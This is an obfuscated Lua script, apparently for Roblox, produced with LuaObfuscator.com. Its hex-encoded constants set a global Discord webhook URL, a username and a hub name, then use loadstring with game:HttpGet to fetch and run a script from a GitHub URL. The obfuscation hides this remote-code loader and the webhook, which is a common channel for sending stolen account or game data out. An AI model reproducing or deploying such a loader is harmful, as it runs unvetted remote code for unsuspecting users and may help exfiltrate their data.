--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v69=v2(v0(v30,16));if v19 then local v77=v5(v69,v19);v19=nil;return v77;else return v69;end end end);local function v20(v31,v32,v33)if v33 then local v70=0 -0 ;local v71;while true do if (v70==(0 -(1270 -(226 + 1044)))) then v71=(v31/((3 -1)^(v32-(2 -1))))%((621 -(555 + 64))^(((v33-(932 -(857 + 74))) -(v32-((2477 -1908) -(367 + 201)))) + (928 -(214 + 713)))) ;return v71-(v71%(1 + 0)) ;end end else local v72=0 + 0 ;local v73;while true do if (v72==((994 -(32 + 85)) -(282 + 595))) then v73=(1639 -(1493 + 30 + 114))^(v32-(1 + 0)) ;return (((v31%(v73 + v73))>=v73) and (1 -0)) or (1065 -(68 + 997)) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v36 * (610 -354)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + ((12 -7) -2) );v18=v18 + (7 -(3 + 0)) ;return (v40 * (16777566 -((345 -258) + (1215 -(802 + 150))))) + (v39 * (65716 -(67 + 113))) + (v38 * (188 + 68)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=2 -1 ;local v44=(v20(v42,1 -(0 -0) ,15 + 5 ) * ((999 -(915 + 82))^32)) + v41 ;local v45=v20(v42,59 -38 ,19 + 12 );local v46=((v20(v42,41 -9 )==1) and  -(1188 -(1069 + 118))) or 1 ;if (v45==0) then if (v44==((0 + 0) -0)) then return v46 * 0 ;else v45=1 -0 ;v43=0 + 0 ;end elseif (v45==(3636 -1589)) then return ((v44==(0 + (0 -0))) and (v46 * ((792 -(368 + 423))/((438 -(145 + 293)) -0)))) or (v46 * NaN) ;end return v8(v46,v45-(1041 -(10 + 8)) ) * (v43 + (v44/((7 -5)^((924 -(44 + 386)) -(416 + 26))))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==(1486 -(998 + 488))) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v67=1 + 0 , #v48 do v49[v67]=v2(v1(v3(v48,v67,v67)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0 -0 ;local v51;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v50==(4 -2)) then v55=nil;v56=nil;v50=3;end if (v50~=(9 -5)) then else v59=nil;while true do if (v51==(606 -(268 + 335))) then v58=nil;v59=nil;v51=4;end if (v51==1) then local v94=290 -(60 + 230) ;while true do if (v94==0) then v54=nil;v55=nil;v94=573 -(426 + 146) ;end if (v94==(1 + 0)) then v51=2;break;end end end if (4==v51) then while true do if (v52==2) then local v102=1456 -(282 + 1174) ;while true do if (v102==(812 -(569 + 242))) then v52=3;break;end if (v102~=0) then else local v106=0;while true do if (1~=v106) then else v102=2 -1 ;break;end if (v106==(0 + 0)) then v57=nil;v58=nil;v106=1025 -(706 + 318) ;end end end end end if (v52==0) then local v103=0;while true do if (0==v103) then v53=1251 -(721 + 530) ;v54=nil;v103=1;end if (v103~=1) then else v52=1;break;end end end if (v52~=(1272 -(945 + 326))) then else v55=nil;v56=nil;v52=2;end if (v52==(7 -4)) then v59=nil;while true do local v104=0;local v105;while true do if (v104==0) then v105=0;while true do if (v105~=(1 + 0)) then else if (v53~=(700 -(271 + 429))) then else local v152=0;local v153;local v154;while true do if (1~=v152) then else while true do if (v153~=0) then else v154=0 + 0 ;while true do if (v154==0) then local v186=0;while true do if (v186~=(1501 -(1408 + 92))) then else v154=1;break;end if (v186~=0) then else local v192=1086 -(461 + 625) ;while true do if ((1288 -(993 + 295))==v192) then v54={};v55={};v192=1 + 0 ;end if (v192==1) then v186=1172 -(418 + 753) ;break;end end end end end if (v154==(1 + 0)) then v56={};v53=1 + 0 ;break;end end break;end end break;end if ((0 + 0)==v152) then v153=0;v154=nil;v152=1;end end end if (v53~=3) then else local v155=0;local v156;local v157;while true do if (v155==0) then v156=0 + 0 ;v157=nil;v155=530 -(406 + 123) ;end if (v155~=1) then else while true do if (v156~=(1769 -(1749 + 20))) then else v157=0 + 0 ;while true do if ((1322 -(1249 + 73))~=v157) then else local v187=0 + 0 ;local v188;while true do if ((1145 -(466 + 679))~=v187) then else v188=0 -0 ;while true do if (v188==(0 -0)) then local v195=1900 -(106 + 1794) ;while true do if (v195~=(0 + 0)) then else for v203=1 + 0 ,v23() do v55[v203-1 ]=v28();end return v57;end end end end break;end end end end break;end end break;end end end break;end if (0==v105) then local v112=0 -0 ;local v113;while true do if (v112~=0) then else v113=0 -0 ;while true do if (v113==(115 -(4 + 110))) then v105=585 -(57 + 527) ;break;end if (v113==0) then local v185=1427 -(41 + 1386) ;while true do if (v185==1) then v113=1;break;end if (v185==(103 -(17 + 86))) then if (v53==1) then local v189=0;while true do if (v189~=(0 + 0)) then else local v193=0 -0 ;local v194;while true do if (v193==(0 -0)) then v194=166 -(122 + 44) ;while true do if (v194==0) then local v201=0 -0 ;while true do if (v201~=(0 -0)) then else v57={v54,v55,nil,v56};v58=v23();v201=1 -0 ;end if (v201==1) then v194=1;break;end end end if (v194==1) then v189=1;break;end end break;end end end if (v189==1) then v59={};v53=2;break;end end end if (v53==2) then local v190=65 -(30 + 35) ;local v191;while true do if (v190==(0 + 0)) then v191=0;while true do if (v191==(1258 -(1043 + 214))) then for v197=3 -2 ,v23() do local v198=0;local v199;local v200;while true do if (v198==1) then while true do if (v199==(1212 -(323 + 889))) then v200=v21();if (v20(v200,2 -1 ,1)==0) then local v210=0;local v211;local v212;local v213;local v214;while true do if ((580 -(361 + 219))~=v210) then else v211=0;v212=nil;v210=1;end if (v210==(322 -(53 + 267))) then while true do if (1~=v211) then else v214={v22(),v22(),nil,nil};if (v212==0) then local v219=0 -0 ;local v220;while true do if (v219~=0) then else v220=0;while true do if (v220~=(0 + 0)) then else v214[3]=v22();v214[3 + 1 ]=v22();break;end end break;end end elseif (v212==(851 -(20 + 830))) then v214[3 + 0 ]=v23();elseif (v212==2) then v214[3]=v23() -((128 -(116 + 10))^16) ;elseif (v212==(1 + 2)) then local v232=0;local v233;local v234;while true do if (v232~=(739 -(542 + 196))) then else while true do if (v233==0) then v234=0 -0 ;while true do if (v234==(0 + 0)) then v214[2 + 1 ]=v23() -((1 + 1)^16) ;v214[4]=v22();break;end end break;end end break;end if (v232==(0 -0)) then v233=0 -0 ;v234=nil;v232=1;end end end v211=1553 -(1126 + 425) ;end if (v211==(405 -(118 + 287))) then local v215=0;local v216;while true do if (v215==0) then v216=0;while true do if (v216~=0) then else local v229=0 -0 ;while true do if (v229~=(1122 -(118 + 1003))) then else v216=2 -1 ;break;end if (v229==(377 -(142 + 235))) then v212=v20(v200,9 -7 ,3);v213=v20(v200,4,2 + 4 );v229=978 -(553 + 424) ;end end end if (v216==1) then v211=1;break;end end break;end end end if (v211==(3 -1)) then local v217=0;while true do if (v217==1) then v211=3 + 0 ;break;end if ((0 + 0)~=v217) then else if (v20(v213,1,1 + 0 )~=1) then else v214[1 + 1 ]=v59[v214[2]];end if (v20(v213,2,2 + 0 )~=1) then else v214[6 -3 ]=v59[v214[7 -4 ]];end v217=1;end end end if (v211==3) then if (v20(v213,6 -3 ,1 + 2 )==1) then v214[19 -15 ]=v59[v214[4]];end v54[v197]=v214;break;end end break;end if (v210~=(754 -(239 + 514))) then else v213=nil;v214=nil;v210=2;end end end break;end end break;end if (0==v198) then v199=0 + 0 ;v200=nil;v198=1;end end end v53=1332 -(797 + 532) ;break;end if (v191==0) then local v196=0;while true do if (v196==0) then for v205=1 + 0 ,v58 do local v206=0 + 0 ;local v207;local v208;while true do if (v206==(0 -0)) then v207=v21();v208=nil;v206=1203 -(373 + 829) ;end if (v206==(732 -(476 + 255))) then if (v207==1) then v208=v21()~=(1130 -(369 + 761)) ;elseif (v207==2) then v208=v24();elseif (v207==(2 + 1)) then v208=v25();end v59[v205]=v208;break;end end end v57[3]=v21();v196=1 -0 ;end if (v196==(1 -0)) then v191=239 -(64 + 174) ;break;end end end end break;end end end v185=1;end end end end break;end end end end break;end end end break;end end break;end if (v51==0) then v52=0 + 0 ;v53=nil;v51=1;end if ((2 -0)==v51) then local v95=336 -(144 + 192) ;while true do if (1~=v95) then else v51=219 -(42 + 174) ;break;end if (v95==(0 + 0)) then v56=nil;v57=nil;v95=1 + 0 ;end end end end break;end if (v50==(1 + 0)) then v53=nil;v54=nil;v50=1506 -(363 + 1141) ;end if (0==v50) then v51=1580 -(1183 + 397) ;v52=nil;v50=1;end if (v50==3) then v57=nil;v58=nil;v50=11 -7 ;end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (v63==1) then v66=v60[3];return function(...)local v78=v64;local v79=v65;local v80=v66;local v81=v27;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v92=0,v86 do if (v92>=v80) then v84[v92-v80 ]=v85[v92 + 1 ];else v88[v92]=v85[v92 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do local v93=0;while true do if (v93==1) then if (v91<=6) then if (v91<=2) then if (v91<=0) then local v107=0;local v108;local v109;local v110;local v111;while true do if (v107==1) then v83=(v110 + v108) -1 ;v111=0;v107=2;end if (v107==2) then for v158=v108,v83 do v111=v111 + 1 ;v88[v158]=v109[v111];end break;end if (v107==0) then v108=v90[2];v109,v110=v81(v88[v108](v13(v88,v108 + 1 ,v90[3])));v107=1;end end elseif (v91==1) then v88[v90[2]]=v90[3];elseif (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end elseif (v91<=4) then if (v91>3) then v88[v90[2]]=v62[v90[3]];else for v147=v90[2],v90[3] do v88[v147]=nil;end end elseif (v91==5) then local v118=v90[2];v88[v118](v88[v118 + 1 ]);else v82=v90[3];end elseif (v91<=9) then if (v91<=7) then v88[v90[2]]();elseif (v91>8) then local v120=v90[2];v88[v120]=v88[v120](v13(v88,v120 + 1 ,v83));else local v122;local v123,v124;local v125;local v126;v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v126=v90[2];v88[v126](v88[v126 + 1 ]);v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v126=v90[2];v125=v88[v90[3]];v88[v126 + 1 ]=v125;v88[v126]=v125[v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v126=v90[2];v123,v124=v81(v88[v126](v13(v88,v126 + 1 ,v90[3])));v83=(v124 + v126) -1 ;v122=0;for v149=v126,v83 do v122=v122 + 1 ;v88[v149]=v123[v122];end v82=v82 + 1 ;v90=v78[v82];v126=v90[2];v88[v126]=v88[v126](v13(v88,v126 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]();end elseif (v91<=11) then if (v91>10) then do return;end else local v137=0;local v138;while true do if (v137==8) then v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v137=9;end if (v137==2) then v90=v78[v82];v138=v90[2];v88[v138](v88[v138 + 1 ]);v137=3;end if (v137==0) then v138=nil;v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v137=1;end if (v137==6) then v82=v82 + 1 ;v90=v78[v82];v138=v90[2];v137=7;end if (3==v137) then v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v137=4;end if (v137==4) then v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v137=5;end if (v137==1) then v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v137=2;end if (v137==7) then v88[v138](v88[v138 + 1 ]);v82=v82 + 1 ;v90=v78[v82];v137=8;end if (v137==5) then v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v137=6;end if (v137==9) then v82=v90[3];break;end end end elseif (v91==12) then v88[v90[2]]=v88[v90[3]][v90[4]];else local v141=v90[2];local v142=v88[v90[3]];v88[v141 + 1 ]=v142;v88[v141]=v142[v90[4]];end v82=v82 + 1 ;break;end if (0==v93) then v90=v78[v82];v91=v90[1];v93=1;end end end end;end if (v63==0) then v64=v60[1];v65=v60[2];v63=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F47030A3O00576562682O6F6B55726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3135373230313730363532363937382O31392F3559537947414B6F61546B70434C75652O7753354437555334337672476166493647782O7341497A653150596F375652624362305433633431576F4A486A6B2O55785030030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F6769746875622E636F6D2F4A61792O696F6365616E2O692F5065616B4F6E546F702F626C6F622F6D61696E2F7065616B2E6C756103083O00557365726E616D65030B3O004B6972797568613034303103073O004875624E616D65030B3O004469616D6F6E642048756200223O0012013O00014O0003000100013O0026023O0002000100010004063O00020001001201000100013O00260200010013000100020004063O00130001001204000200033O00200800020002000400122O000300056O00020002000100122O000200063O00122O000300073O00202O00030003000800122O000500096O000300056O00023O00024O0002000100010004063O0021000100260200010005000100010004063O00050001001204000200033O00200A00020002000A00122O0003000B6O00020002000100122O000200033O00202O00020002000C00122O0003000D6O00020002000100122O000100023O00044O000500010004063O002100010004063O000200012O000B3O00017O00",v9(),...);
